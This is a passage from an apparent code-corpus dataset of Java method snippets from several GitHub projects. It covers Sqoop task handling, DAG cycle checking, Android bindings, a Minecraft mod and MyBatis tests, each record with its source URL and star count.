"InterruptedException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void killProcess(int pid) throws IOException, InterruptedException {        super.killProcess(pid);        if(StringUtils.isNotBlank(this.clusterJobId)){            RunShell shell = new RunShell(\"hadoop job -kill \" +                    this.clusterJobId);            shell.run();        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"DataxTaskProcess{\" +                \"jobId=\" + getJobId() +                \", taskId=\" + getTaskId() +                \", taskConfig='\" + getTaskConfig()  + '\\'' +                '}';    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "mask", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String mask(String command){        String[] commandsSpliced = command.split(\"\\\\s+\");        for(int i = 0; i < commandsSpliced.length; i++){            if(commandsSpliced[i].contains(\"password\") && i + 1 < commandsSpliced.length){                commandsSpliced[i + 1] = \"\";            }        }        return StringUtils.join(commandsSpliced, \" \");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "getMaxWaitMins", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getMaxWaitMins() {    return this.maxWaitMins;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMaxWaitMins", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setMaxWaitMins(final Long maxWaitMins) {    this.maxWaitMins = maxWaitMins;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSchedule", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getSchedule() {    return this.schedule;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSchedule", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSchedule(final Map<String, String> schedule) {    this.schedule = schedule;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTriggerDependencies", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TriggerDependencyBean>", "snippet": "  public List<TriggerDependencyBean> getTriggerDependencies() {    return this.triggerDependencies == null ? Collections.emptyList() : this.triggerDependencies;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTriggerDependencies", "params": ["List<TriggerDependencyBean>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setTriggerDependencies(      final List<TriggerDependencyBean> triggerDependencies) {    this.triggerDependencies = triggerDependencies;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {    return \"FlowTriggerBean{\" +        \"maxWaitMins='\" + this.maxWaitMins + '\\'' +        \", schedule=\" + this.schedule +        \", triggerDependencies=\" + this.triggerDependencies +        '}';  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowTriggerBean.java", "stars": "18", "class": {"name": "FlowTriggerBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "calculateDistanceToFinalSnap", "params": ["android", "android"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int[] calculateDistanceToFinalSnap (android.support.v7.widget.RecyclerView.LayoutManager p0, android.view.View p1)\t{\t\treturn n_calculateDistanceToFinalSnap (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_calculateDistanceToFinalSnap", "params": ["android", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "int", "snippet": "\tprivate native int[] n_calculateDistanceToFinalSnap (android.support.v7.widget.RecyclerView.LayoutManager p0, android.view.View p1);\tpublic android.view.View findSnapView (android.support.v7.widget.RecyclerView.LayoutManager p0)\t{\t\treturn n_findSnapView (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "findSnapView", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.view.View findSnapView (android.support.v7.widget.RecyclerView.LayoutManager p0)\t{\t\treturn n_findSnapView (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_findSnapView", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "android", "snippet": "\tprivate native android.view.View n_findSnapView (android.support.v7.widget.RecyclerView.LayoutManager p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSnapHelper.java", "stars": "2", "class": {"name": "StartSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "inicializar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void inicializar() {\t\tdao = new CategoriaDao();\t\tbuscarCategorias();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buscarCategorias", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void buscarCategorias() {\t\tcategorias = dao.buscarTodos();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "excluir", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void excluir() {\t\tdao.excluir(categoriaSelecionada);\t\tbuscarCategorias();\t\t\t\tFacesUtil.addInfoMessage(\"Categoria excluida com sucesso\");\t\t\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "pesquisarPorNome", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void pesquisarPorNome(String nome) {\t\tcategorias = dao.pesquisarPorNome(nome);\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategorias", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Categoria>", "snippet": "\tpublic List<Categoria> getCategorias() {\t\treturn categorias;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CategoriaDao", "snippet": "\tpublic CategoriaDao getDao() {\t\treturn dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDao", "params": ["CategoriaDao"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDao(CategoriaDao dao) {\t\tthis.dao = dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategoriaSelecionada", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Categoria", "snippet": "\tpublic Categoria getCategoriaSelecionada() {\t\treturn categoriaSelecionada;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCategoriaSelecionada", "params": ["Categoria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCategoriaSelecionada(Categoria categoriaSelecionada) {\t\tthis.categoriaSelecionada = categoriaSelecionada;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCategorias", "params": ["List<Categoria>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCategorias(List<Categoria> categorias) {\t\tthis.categorias = categorias;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaCategoriaBean.java", "stars": "1", "class": {"name": "PesquisaCategoriaBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args)\t{ \t\tScanner in = new Scanner(System.in);\t\t\t\tSystem.out.print(\"How many numbers do you need to draw?\");\t\tint k = in.nextInt();\t\t\t\tSystem.out.print(\"What is the highest number you can draw?\");\t\tint n = in.nextInt();\t\t\t\t/*\t\t * compute binomial coefficient n*(n-1)*(n-2)*...*(n-k+1)/(1*2*3*...*k)\t\t */\t\t\t\tBigInteger lotteryOdds = BigInteger.valueOf(1);\t\t\t\tfor(int i = 1; i <= k; i++)\t\t\tlotteryOdds = ((BigInteger) lotteryOdds).multiply(BigInteger.valueOf(n - i + 1)).divide(BigInteger.valueOf(i));\t\t\t\tSystem.out.println(\"Your odds are 1 in \" + lotteryOdds + \". Good luck!\");\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Dashuzhi.java", "stars": "2", "class": {"name": "Dashuzhi", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onUpdate", "params": ["ItemStack", "World", "Entity", "int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(ItemStack stack, World worldIn, Entity entityIn, int itemSlot, boolean isSelected) {        super.onUpdate(stack, worldIn, entityIn, itemSlot, isSelected);        IARadCenter center = worldIn.getChunkFromBlockCoords(new BlockPos(entityIn.posX, entityIn.posY, entityIn.posZ)).getCapability(CapabilityEVE.EVE_CHUNK, null);        if (center == null)            return;        if (stack.getTagCompound() == null)            stack.setTagCompound(new NBTTagCompound());        stack.getTagCompound().setFloat(\"hue\", center.getHueRange().getMid());        stack.getTagCompound().setFloat(\"brightness\", center.getBrightnessRange().getMid());    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemPrism/ItemPrism.java", "stars": "2", "class": {"name": "ItemPrism", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "showDurabilityBar", "params": ["ItemStack"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean showDurabilityBar(ItemStack stack) {        return false;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemPrism/ItemPrism.java", "stars": "2", "class": {"name": "ItemPrism", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDurabilityForDisplay", "params": ["ItemStack"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getDurabilityForDisplay(ItemStack stack) {        return 0.0;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemPrism/ItemPrism.java", "stars": "2", "class": {"name": "ItemPrism", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getRGBDurabilityForDisplay", "params": ["ItemStack"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRGBDurabilityForDisplay(ItemStack stack) {        float hue = NBTHelper.getOrDefault(stack.getTagCompound(), \"hue\", 0f);        float brightness = NBTHelper.getOrDefault(stack.getTagCompound(), \"brightness\", 0f);        return Color.HSBtoRGB(hue, 1f, brightness);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemPrism/ItemPrism.java", "stars": "2", "class": {"name": "ItemPrism", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "canInteractWith", "params": ["EntityPlayer"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canInteractWith(EntityPlayer playerIn) {        return playerIn.getHeldItemMainhand() == inv.colliculus || playerIn.getHeldItemOffhand() == inv.colliculus;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemColliculus/ContainerColliculus.java", "stars": "2", "class": {"name": "ContainerColliculus", "extends": "Container", "implements": null, "modifiers": ["public"]}}, {"method_name": "transferStackInSlot", "params": ["EntityPlayer", "int"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "    public ItemStack transferStackInSlot(EntityPlayer playerIn, int index) {        ItemStack itemstack = ItemStack.EMPTY;        Slot slot = inventorySlots.get(index);        if (slot != null && slot.getHasStack()) {            ItemStack stack1 = slot.getStack();            itemstack = stack1.copy();            int occStart = 0;            int occEnd = occStart + 4;            int invEnd = occEnd + 36;            if (index < occEnd) {                if (!mergeItemStack(stack1, occEnd, invEnd, true))                    return ItemStack.EMPTY;            } else {                if (!itemstack.isEmpty() && !mergeItemStack(stack1, occStart, occEnd, false))                    return ItemStack.EMPTY;            }            if (stack1.isEmpty())                slot.putStack(ItemStack.EMPTY);            else slot.onSlotChanged();            if (stack1.getCount() == itemstack.getCount())                return ItemStack.EMPTY;            slot.onTake(playerIn, stack1);        }        return itemstack;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemColliculus/ContainerColliculus.java", "stars": "2", "class": {"name": "ContainerColliculus", "extends": "Container", "implements": null, "modifiers": ["public"]}}, {"method_name": "createNode", "params": ["String", "NodeProcessor"], "throws": null, "modifiers": ["public"], "return_type": "Node", "snippet": "  public Node createNode(final String name, final NodeProcessor nodeProcessor) {    checkIsBuilt();    if (this.nameToNodeMap.get(name) != null) {      throw new DagException(String.format(\"Node names in %s need to be unique. The name \"          + \"(%s) already exists.\", this, name));    }    final Node node = new Node(name, nodeProcessor, this.dag);    this.nameToNodeMap.put(name, node);    return node;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkIsBuilt", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void checkIsBuilt() {    if (this.isBuilt) {      final String msg = String          .format(\"The DAG (%s) is built already. Can't create new nodes.\", this);      throw new DagException(msg);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addParentNode", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addParentNode(final String childNodeName, final String parentNodeName) {    checkIsBuilt();    final Node child = this.nameToNodeMap.get(childNodeName);    if (child == null) {      throw new DagException(String.format(\"Unknown child node (%s). Did you create the node?\",          childNodeName));    }    final Node parent = this.nameToNodeMap.get(parentNodeName);    if (parent == null) {      throw new DagException(          String.format(\"Unknown parent node (%s). Did you create the node?\", parentNodeName));    }    child.addParent(parent);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Dag", "snippet": "  public Dag build() {    checkIsBuilt();    checkCircularDependencies();    this.isBuilt = true;    return this.dag;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkCircularDependencies", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void checkCircularDependencies() {    class CircularDependencyChecker {      // The nodes that need to be visited      private final Set<Node> toVisit = new HashSet<>(DagBuilder.this.nameToNodeMap.values());      // The nodes that have finished traversing all their parent nodes      private final Set<Node> finished = new HashSet<>();      // The nodes that are waiting for their parent nodes to finish visit.      private final Set<Node> ongoing = new HashSet<>();      // One sample of nodes that form a circular dependency      private final List<Node> sampleCircularNodes = new ArrayList<>();      /**       * Checks if the builder contains nodes that form a circular dependency ring.       *       * @throws DagException if true       */      private void check() {        while (!this.toVisit.isEmpty()) {          final Node node = removeOneNodeFromToVisitSet();          if (checkNode(node)) {            final String msg = String.format(\"Circular dependency detected. Sample: %s\",                this.sampleCircularNodes);            throw new DagException(msg);          }        }      }      /**       * Removes one node from the toVisit set and returns that node.       *       * @return a node       */      private Node removeOneNodeFromToVisitSet() {        final Iterator<Node> iterator = this.toVisit.iterator();        final Node node = iterator.next();        iterator.remove();        return node;      }      /**       * Checks if the node is part of a group of nodes that form a circular dependency ring.       *       * <p>If true, the node will be added to the sampleCircularNodes list</p>       *       * @param node node to check       * @return true if it is       */      private boolean checkNode(final Node node) {        if (this.finished.contains(node)) {          return false;        }        if (this.ongoing.contains(node)) {          this.sampleCircularNodes.add(node);          return true;        }        this.toVisit.remove(node);        this.ongoing.add(node);        for (final Node parent : node.getParents()) {          if (checkNode(parent)) {            this.sampleCircularNodes.add(node);            return true;          }        }        this.ongoing.remove(node);        this.finished.add(node);        return false;      }    }    final CircularDependencyChecker checker = new CircularDependencyChecker();    checker.check();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {    return String.format(\"DagBuilder (%s)\", this.dag.getName());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "DagBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "check", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "      private void check() {        while (!this.toVisit.isEmpty()) {          final Node node = removeOneNodeFromToVisitSet();          if (checkNode(node)) {            final String msg = String.format(\"Circular dependency detected. Sample: %s\",                this.sampleCircularNodes);            throw new DagException(msg);          }        }      }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "CircularDependencyChecker", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "removeOneNodeFromToVisitSet", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Node", "snippet": "      private Node removeOneNodeFromToVisitSet() {        final Iterator<Node> iterator = this.toVisit.iterator();        final Node node = iterator.next();        iterator.remove();        return node;      }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "CircularDependencyChecker", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "checkNode", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "      private boolean checkNode(final Node node) {        if (this.finished.contains(node)) {          return false;        }        if (this.ongoing.contains(node)) {          this.sampleCircularNodes.add(node);          return true;        }        this.toVisit.remove(node);        this.ongoing.add(node);        for (final Node parent : node.getParents()) {          if (checkNode(parent)) {            this.sampleCircularNodes.add(node);            return true;          }        }        this.ongoing.remove(node);        this.finished.add(node);        return false;      }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagBuilder.java", "stars": "18", "class": {"name": "CircularDependencyChecker", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setUp", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void setUp() throws SQLException {    ps = PreparedStatementLogger.newInstance(this.preparedStatement, log, 1);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/logging/jdbc/PreparedStatementLoggerTest.java", "stars": "15", "class": {"name": "PreparedStatementLoggerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldPrintParameters", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void shouldPrintParameters() throws SQLException {    when(log.isDebugEnabled()).thenReturn(true);    when(preparedStatement.executeQuery(anyString())).thenReturn(resultSet);    ps.setInt(1, 10);    ResultSet rs = ps.executeQuery(\"select 1 limit ?\");    verify(log).debug(contains(\"Parameters: 10(Integer)\"));    Assertions.assertNotNull(rs);    Assertions.assertNotSame(resultSet, rs);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/logging/jdbc/PreparedStatementLoggerTest.java", "stars": "15", "class": {"name": "PreparedStatementLoggerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldPrintNullParameters", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void shouldPrintNullParameters() throws SQLException {    when(log.isDebugEnabled()).thenReturn(true);    when(preparedStatement.execute(anyString())).thenReturn(true);    ps.setNull(1, JdbcType.VARCHAR.TYPE_CODE);    boolean result = ps.execute(\"update name = ? from test\");    verify(log).debug(contains(\"Parameters: null\"));    Assertions.assertTrue(result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/logging/jdbc/PreparedStatementLoggerTest.java", "stars": "15", "class": {"name": "PreparedStatementLoggerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldNotPrintLog", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void shouldNotPrintLog() throws SQLException {    ps.getResultSet();    ps.getParameterMetaData();    verify(log, times(0)).debug(anyString());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/logging/jdbc/PreparedStatementLoggerTest.java", "stars": "15", "class": {"name": "PreparedStatementLoggerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldPrintUpdateCount", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void shouldPrintUpdateCount() throws SQLException {    when(log.isDebugEnabled()).thenReturn(true);    when(preparedStatement.getUpdateCount()).thenReturn(1);    ps.getUpdateCount();    verify(log).debug(contains(\"Updates: 1\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/logging/jdbc/PreparedStatementLoggerTest.java", "stars": "15", "class": {"name": "PreparedStatementLoggerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "distribuer", "params": ["List<DistributionMasque>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void distribuer(List<DistributionMasque> distributionMasques) {        distributionMasquePersistance.persister(distributionMasques);    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/DistribuerMasques.java", "stars": "5", "class": {"name": "DistribuerMasques", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create an SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/results_id/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/results_id/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/ResultsIdTest.java", "stars": "15", "class": {"name": "ResultsIdTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNamingResults", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testNamingResults() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User user = mapper.getUserByName(\"User2\");      assertEquals(Integer.valueOf(2), user.getId());      assertEquals(\"User2\", user.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/ResultsIdTest.java", "stars": "15", "class": {"name": "ResultsIdTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testResultsOnlyForNaming", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testResultsOnlyForNaming() {    try (SqlSession sqlSession = 